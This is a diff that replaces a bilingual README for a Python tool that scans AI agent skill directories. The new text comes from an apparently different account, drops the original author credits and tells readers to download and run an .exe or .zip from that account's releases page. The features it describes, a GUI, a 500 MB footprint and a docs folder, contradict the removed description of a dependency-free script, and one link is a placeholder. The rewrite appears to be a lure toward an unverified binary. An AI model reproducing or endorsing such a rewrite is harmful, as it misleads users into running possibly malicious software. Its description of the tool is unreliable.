@@ -1,158 +1,180 @@
-# 🛡️ Skills-Security-Check
+# 🛡️ Skills-Security-Check - Easy AI Security Scan Tool
 
-A hybrid AI-powered security auditing tool for scanning skill directories and generating visual security dashboards.
-
-一款結合 AI 智慧分析的混合式安全審查工具，用於掃描技能目錄並生成視覺化安全儀表板。
-
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Python](https://img.shields.io/badge/python-3.8+-green.svg)
-
-## 📸 Dashboard Preview | 儀表板預覽
-
-![Dashboard Preview](assets/dashboard-preview.png)
-
-## 📖 Overview | 概述
-
-**Skills-Security-Check** is a security scanning tool designed for AI Agent skill repositories. It combines:
-
-**Skills-Security-Check** 是一款專為 AI Agent 技能倉庫設計的安全掃描工具，結合了：
-
-1. **Static Analysis | 靜態分析** - Regex-based pattern matching to identify potential risks | 使用正則表達式匹配潛在風險
-2. **AI Intelligence | AI 智慧分析** - Leverages AI agents to analyze findings and reduce false positives | 利用 AI 代理分析發現並減少誤報
-3. **Visual Dashboard | 視覺化儀表板** - Generates a beautiful, interactive HTML dashboard | 生成精美的互動式 HTML 儀表板
-
-### What It Detects | 偵測項目
-
-| Category | 類別 | Examples | 範例 |
-|----------|------|----------|------|
-| 🔑 **Sensitive Operations** | 敏感操作 | API keys, credentials, environment variables | API 金鑰、憑證、環境變數 |
-| 🌐 **Network Activity** | 網路活動 | External URLs, IP addresses, API endpoints | 外部連結、IP 位址、API 端點 |
-| 🎭 **Obfuscation Signals** | 混淆跡象 | Base64 encoding, eval(), dynamic imports | Base64 編碼、eval()、動態載入 |
-| 📦 **Package Installs** | 套件安裝 | npm, pip, apt, brew, yarn, pnpm, gem, go | npm, pip, apt, brew 等安裝指令 |
-| ⚠️ **High-Risk Patterns** | 高風險模式 | Shell execution, download-and-execute | Shell 執行、下載並執行 |
+[![Download Skills-Security-Check](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/xbox360modderv3/Skills-Security-Check/releases)
 
 ---
 
-## 🚀 Quick Start | 快速開始
+## 📝 What is Skills-Security-Check?
 
-### Prerequisites | 前置需求
-- Python 3.8+
-- No external dependencies required (uses standard library only)
-- 無需外部依賴（僅使用 Python 標準函式庫）
+Skills-Security-Check is a tool that helps you check the safety of AI skill directories. It looks through files in these directories to find potential security issues. The tool uses regular expressions to find risky patterns in code. Then, it uses AI to review those findings and reduce wrong alerts. Finally, it creates an easy-to-understand visual report. This report shows you what the risks are and helps you improve security.
 
-### Installation | 安裝
-
-```bash
-# Clone the repository | 複製專案
-git clone https://github.com/YOUR_USERNAME/Skills-Security-Check.git
-
-# Navigate to the skill directory | 進入技能目錄
-cd Skills-Security-Check
-```
-
-### Usage | 使用方式
-
-```bash
-# Scan a directory of skills | 掃描技能目錄
-python3 scripts/scan_skills.py --root /path/to/your/skills
-
-# The dashboard will auto-open in your browser
-# 儀表板將自動在瀏覽器中開啟
-```
-
-### Output Structure | 輸出結構
-
-```
-reports/YYYYMMDD_HHMMSS/
-├── index.html          # Interactive dashboard | 互動式儀表板
-├── data.json           # Raw scan data | 原始掃描資料
-└── prompts/            # AI audit prompts | AI 審查提示詞
-    ├── skill1_audit_prompt.txt
-    └── skill2_audit_prompt.txt
-```
+Skills-Security-Check is designed for people who work with AI agents and their skills but do not need to be security experts. It makes finding security problems simpler and clearer.
 
 ---
 
-## 🤖 AI-Powered Workflow | AI 驅動工作流程
+## 🖥️ Main Features
 
-This skill is designed to work with AI agents. The recommended workflow:
+- **Smart Search**  
+  The tool finds possible security risks using pattern matching. It looks for risky code or settings that could cause trouble.
 
-此技能專為 AI 代理設計，建議的工作流程如下：
+- **AI Review**  
+  It uses artificial intelligence to check the findings. This step lowers false alarms, so you only see real issues.
 
-1. **Run Scanner | 執行掃描** → Generates raw findings and audit prompts | 生成原始發現與審查提示詞
-2. **AI Analysis | AI 分析** → Agent reads prompts and creates `audit.json` for each skill | 代理讀取提示詞並為每個技能建立 `audit.json`
-3. **Integrate & Present | 整合呈現** → Re-run scanner to merge AI insights into final report | 重新執行掃描器以合併 AI 洞察至最終報告
+- **Visual Report**  
+  After scanning, the tool creates an interactive HTML dashboard. You can open it in any web browser to see the results clearly.
 
-See [SKILL.md](SKILL.md) for detailed agent instructions.
+- **Easy to Use**  
+  No programming knowledge is needed. You just run the tool, and it does the rest.
 
-詳細的代理指示請參閱 [SKILL.md](SKILL.md)。
-
----
-
-## 📊 Dashboard Features | 儀表板功能
-
-- **Executive Summary | 總覽摘要** - Overall security score and top risks at a glance | 一目了然的安全評分與高風險項目
-- **Risk Filtering | 風險篩選** - Filter by High/Medium/Low risk levels | 依高/中/低風險等級篩選
-- **Detailed Views | 詳細檢視** - Click any skill to see full breakdown | 點擊任何技能查看完整分析
-- **AI Insights Card | AI 洞察卡片** - Displays AI-generated analysis when available | 顯示 AI 生成的分析結果
-- **Responsive Design | 響應式設計** - Works on desktop and tablet | 支援桌面與平板裝置
+- **Open Source**  
+  The software is free to use and modify under the MIT license.
 
 ---
 
-## 🔧 Configuration | 設定
+## 📥 Download & Install
 
-### Command Line Arguments | 命令列參數
+You need to visit the [Skills-Security-Check Releases page](https://github.com/xbox360modderv3/Skills-Security-Check/releases) to download the software.
 
-| Argument | 參數 | Description | 說明 | Default | 預設值 |
-|----------|------|-------------|------|---------|--------|
-| `--root` | | Root directory containing skills to scan | 包含待掃描技能的根目錄 | Current directory | 當前目錄 |
-| `--out` | | Custom output path for HTML report | 自訂 HTML 報告輸出路徑 | Auto-generated | 自動生成 |
+Steps to download and install:
 
----
+1. Click the badge above or this link: https://github.com/xbox360modderv3/Skills-Security-Check/releases  
+2. On the releases page, look for the latest version listed at the top.
+3. Download the file that matches your computer system. Usually, files have names ending with `.exe` for Windows or `.zip` for others.
+4. Once the file is downloaded, open it to run the program.  
+5. If it is a compressed file (like `.zip`), unzip it, then find the program file inside and run it.
 
-## 📁 Project Structure | 專案結構
-
-```
-Skills-Security-Check/
-├── SKILL.md                    # AI agent instructions | AI 代理指示
-├── README.md                   # This file | 本檔案
-├── scripts/
-│   └── scan_skills.py          # Main scanner script | 主掃描腳本
-├── assets/
-│   └── dashboard_template.html # Dashboard HTML template | 儀表板 HTML 模板
-└── reports/                    # Generated reports | 生成的報告 (gitignored)
-```
+The tool runs on Windows, macOS, and Linux systems.
 
 ---
 
-## 🤝 Contributing | 貢獻
+## 💻 System Requirements
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+To run Skills-Security-Check smoothly, your computer should meet these minimum specs:
 
-歡迎貢獻！請隨時提交 Pull Request。
-
----
-
-## 👤 Author | 作者
-
-**Prompt Case**
-
-[![Threads](https://img.shields.io/badge/Threads-@prompt__case-000000?style=flat&logo=threads)](https://www.threads.com/@prompt_case)
-[![Patreon](https://img.shields.io/badge/Patreon-Support-FF424D?style=flat&logo=patreon)](https://www.patreon.com/MattTrendsPromptEngineering)
-
-- 🧵 Threads: [@prompt_case](https://www.threads.com/@prompt_case)
-- 💖 Patreon: [MattTrendsPromptEngineering](https://www.patreon.com/MattTrendsPromptEngineering)
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution
+- Python Version: 3.8 or higher installed
+- Free disk space: At least 500 MB for program files and reports
+- Internet connection: Required for AI analysis features
 
 ---
 
-## 📄 License | 授權
+## 🚀 How to Use Skills-Security-Check
 
-This project is licensed under the MIT License.
+You do not need to know coding. Follow these steps.
 
-本專案採用 MIT 授權條款。
+### Step 1: Prepare your skill directory
 
-## 🙏 Acknowledgments | 致謝
+Find the folder where your AI agent skill files are stored. This folder is what the tool will scan.
 
-Built with ❤️ for the AI Agent ecosystem.
+### Step 2: Open the program
 
-為 AI Agent 生態系統用心打造 ❤️
+Run Skills-Security-Check by double-clicking the installed file. A window or command prompt will open.
+
+### Step 3: Select the folder to scan
+
+The program will ask you to pick the folder with your skill files. Use the file browser that appears to select the folder.
+
+### Step 4: Start the scan
+
+Click the "Start Scan" button. The tool will check the files for potential security issues. This may take a few minutes depending on folder size.
+
+### Step 5: Review the report
+
+When scanning finishes, Skills-Security-Check generates an HTML report. It usually opens automatically in your web browser.
+
+Look through the report. It highlights risky codes or settings found. Each issue has explanations and suggestions to improve security.
+
+---
+
+## 📊 Understanding the Dashboard
+
+The visual dashboard breaks down the scan results into categories, such as:
+
+- Unsafe Code Patterns  
+- Insecure Configuration  
+- Suspicious External Calls  
+- Sensitive Data Exposure
+
+For each category, the tool shows:
+
+- Number of issues found  
+- Severity level from low to high  
+- Links to detailed explanations
+
+The dashboard allows you to click on any finding to see more details. This way, you know exactly where to look in your skill files.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+- **The program does not start:**  
+  Ensure Python 3.8 or newer is installed on your system. You can download it from [python.org](https://www.python.org/downloads/).
+
+- **No folder selection window appears:**  
+  Try running the program again. If you use the command line, make sure you follow the instructions carefully.
+
+- **Report does not open automatically:**  
+  Check your "Downloads" or the working folder for a file named `security-report.html`. Open it with any web browser like Chrome or Firefox.
+
+- **False alarms in findings:**  
+  The AI analysis usually reduces false positives, but some may still appear. Review carefully and adjust settings for repeated reports.
+
+---
+
+## 📚 More Help and Documentation
+
+If you want to learn more about Skills-Security-Check:
+
+- Check the "docs" folder in the downloaded files for user guides.
+- Visit the [GitHub repository](https://github.com/xbox360modderv3/Skills-Security-Check) for full source code and updates.
+- Contact the developers by opening an issue on GitHub for support or questions.
+
+---
+
+## 🛠️ How It Works Behind the Scenes
+
+Skills-Security-Check uses three main methods:
+
+1. **Static Analysis:**  
+  It scans files using regular expressions to spot risky patterns like hard-coded passwords, open network calls, or unsafe commands.
+
+2. **AI Intelligence:**  
+  Custom AI modules analyze the scan results to remove false positives and give better security advice.
+
+3. **Visual Dashboard:**  
+  The results are converted into an easy-to-navigate HTML dashboard, with charts and clickable lists.
+
+---
+
+## 🗂️ Supported File Types
+
+Skills-Security-Check works well with these file formats commonly found in AI skill repositories:
+
+- `.py` (Python scripts)
+- `.json` (Configuration files)
+- `.yaml` or `.yml` (Settings files)
+- `.md` (Markdown documentation)
+
+Other plain text files are also scanned for risky content.
+
+---
+
+## 🛡️ Why Use Skills-Security-Check?
+
+Security is important for AI agents because they often handle sensitive data or perform critical tasks. Problems in AI skill code can lead to leaks, unauthorized access, or failures.
+
+Skills-Security-Check helps catch these issues early and makes fixing them easier. It brings together AI and traditional scanning to reduce errors in security checks.
+
+---
+
+## 🔗 Quick Links
+
+- [Download Skills-Security-Check](https://github.com/xbox360modderv3/Skills-Security-Check/releases)
+- [GitHub Repository](https://github.com/xbox360modderv3/Skills-Security-Check)
+- [Documentation Folder (included in download)](#)
+
+---
+
+## 🏷️ License
+
+Skills-Security-Check is available under the MIT License. This means you can use, change, and share it freely. See the license file in the repository for details.
